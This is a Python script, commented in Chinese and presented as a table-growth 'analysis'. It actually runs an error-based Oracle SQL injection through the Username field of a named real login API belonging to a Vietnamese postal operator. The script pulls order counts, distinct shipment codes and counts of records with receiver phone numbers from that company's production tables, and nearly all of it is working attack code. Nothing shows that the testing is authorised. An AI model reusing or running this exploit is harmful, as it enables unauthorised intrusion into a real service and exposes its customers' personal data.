#!/usr/bin/env python3
"""
分析TEMP_DATA2_LOG表的数据增长和去重情况
"""

import requests
import json
import time

class TempDataAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def analyze_all_tables_unique_count(self):
        """分析所有表的去重后MABC数"""
        print("=" * 80)
        print("📊 分析所有表的去重后订单数（10月10日）")
        print("=" * 80)
        
        date = '20251010'
        
        tables = [
            ('SHIPMENT', 'CREATE_DATE', 'CODE'),
            ('E1E2_PH', 'NGAY', 'MABC'),
            ('E1E2_PH_TEMP_DATA2_LOG', 'NGAY', 'MABC'),
            ('E1E2_PH_LOG', 'NGAY', 'MABC'),
            ('E1_SMS', 'NGAY', 'MABC'),
        ]
        
        results = {}
        
        for table, date_field, key_field in tables:
            print(f"\n{'='*80}")
            print(f"📊 {table}")
            print(f"{'='*80}")
            
            # 总记录数
            query1 = f"SELECT COUNT(*) FROM EMS.{table} WHERE {date_field}='{date}'"
            total = self.extract_via_error(query1)
            if total:
                print(f"   总记录数: {total:>10}")
                results[f"{table}_total"] = int(total) if total.isdigit() else 0
            
            # 去重后的key数
            query2 = f"SELECT COUNT(DISTINCT {key_field}) FROM EMS.{table} WHERE {date_field}='{date}'"
            unique = self.extract_via_error(query2)
            if unique:
                print(f"   不同{key_field}: {unique:>10}")
                results[f"{table}_unique"] = int(unique) if unique.isdigit() else 0
            
            # 有电话的记录
            phone_fields = ['RECEIVER_PHONE', 'DIENTHOAINHAN', 'PHONE']
            for pf in phone_fields:
                query3 = f"SELECT COUNT(*) FROM EMS.{table} WHERE {date_field}='{date}' AND {pf} IS NOT NULL AND ROWNUM<=10000"
                phone_count = self.extract_via_error(query3)
                if phone_count and phone_count.isdigit() and int(phone_count) > 0:
                    print(f"   有{pf}: {phone_count:>10}")
                    break
                time.sleep(0.5)
            
            time.sleep(2)
        
        return results
    
    def check_mabc_overlap_between_tables(self):
        """检查不同表之间的MABC重叠"""
        print("\n" + "=" * 80)
        print("🔍 检查各表MABC的重叠情况")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取E1E2_PH的一个MABC
        query1 = f"SELECT MABC FROM EMS.E1E2_PH WHERE NGAY='{date}' AND ROWNUM=1"
        sample_mabc = self.extract_via_error(query1)
        
        if sample_mabc:
            print(f"\n样本MABC: {sample_mabc}")
            
            tables = [
                'E1E2_PH',
                'E1E2_PH_TEMP_DATA2_LOG',
                'E1E2_PH_LOG',
                'E1_SMS'
            ]
            
            for table in tables:
                query = f"SELECT COUNT(*) FROM EMS.{table} WHERE MABC='{sample_mabc}' AND NGAY='{date}'"
                count = self.extract_via_error(query)
                if count:
                    print(f"   {table:30} : {count:>5} 条")
                time.sleep(1)
    
    def find_unique_mabcs_across_all_tables(self):
        """找出所有表合并后的唯一MABC总数"""
        print("\n" + "=" * 80)
        print("🎯 估算所有表合并后的唯一订单数")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n📊 各表独立的MABC数:")
        
        tables_mabc = {}
        
        queries = [
            ("E1E2_PH", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            ("TEMP_DATA2_LOG", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
            ("E1E2_PH_LOG", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_LOG WHERE NGAY='{date}'"),
        ]
        
        for name, query in queries:
            count = self.extract_via_error(query)
            if count and count.isdigit():
                print(f"   {name:25} : {int(count):>6} 个MABC")
                tables_mabc[name] = int(count)
            time.sleep(2)
        
        # 估算（假设部分重叠）
        if tables_mabc:
            max_count = max(tables_mabc.values())
            sum_count = sum(tables_mabc.values())
            
            print(f"\n💡 估算:")
            print(f"   最大值（如果完全重叠）: {max_count:,} 个")
            print(f"   总和（如果完全不重叠）: {sum_count:,} 个")
            print(f"   合理估计（50%重叠）: {int((max_count + sum_count)/2):,} 个")
    
    def check_shipment_growth(self):
        """检查SHIPMENT表是否也在增长"""
        print("\n" + "=" * 80)
        print("📈 检查SHIPMENT表的当前数据")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总订单数", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            ("不同CODE数", f"SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            ("过去1小时新增", f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND CREATE_TIME > SYSDATE-1/24"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(1.5)
    
    def final_count_summary(self):
        """最终统计汇总"""
        print("\n" + "=" * 80)
        print("🎯 10月10日最终订单统计（当前时间）")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n主要订单表:")
        
        tables = [
            ("SHIPMENT（订单表）", "SELECT COUNT(DISTINCT CODE) FROM EMS.SHIPMENT WHERE CREATE_DATE='{}'", date),
            ("E1E2_PH（邮件处理）", "SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{}'", date),
            ("TEMP_DATA2_LOG（临时日志）", "SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{}'", date),
        ]
        
        total_shipment = 0
        total_mabc_max = 0
        
        for name, query_template, param in tables:
            query = query_template.format(param)
            count = self.extract_via_error(query)
            if count and count.isdigit():
                count_int = int(count)
                print(f"\n   {name:40}")
                print(f"      去重后: {count_int:>8,} 个")
                
                if "SHIPMENT" in name:
                    total_shipment = count_int
                else:
                    total_mabc_max = max(total_mabc_max, count_int)
            
            time.sleep(2)
        
        print(f"\n{'='*80}")
        print(f"📊 估算当天总订单数:")
        print(f"{'='*80}")
        print(f"\n   SHIPMENT订单:     {total_shipment:>8,} 个")
        print(f"   邮件MABC（去重）:  {total_mabc_max:>8,} 个")
        print(f"   {'─'*50}")
        print(f"   保守估计:         {total_shipment + total_mabc_max:>8,} 个订单")
        print(f"   （假设SHIPMENT和MABC不重叠）")
    
    def run_analysis(self):
        """执行完整分析"""
        print("=" * 80)
        print("📊 TEMP_DATA2_LOG增长分析 + 全表订单统计")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行分析
        results = self.analyze_all_tables_unique_count()
        self.check_mabc_overlap_between_tables()
        self.find_unique_mabcs_across_all_tables()
        self.check_shipment_growth()
        self.final_count_summary()
        
        print("\n" + "=" * 80)
        print("🎉 分析完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    analyzer = TempDataAnalyzer(target_url)
    analyzer.run_analysis()
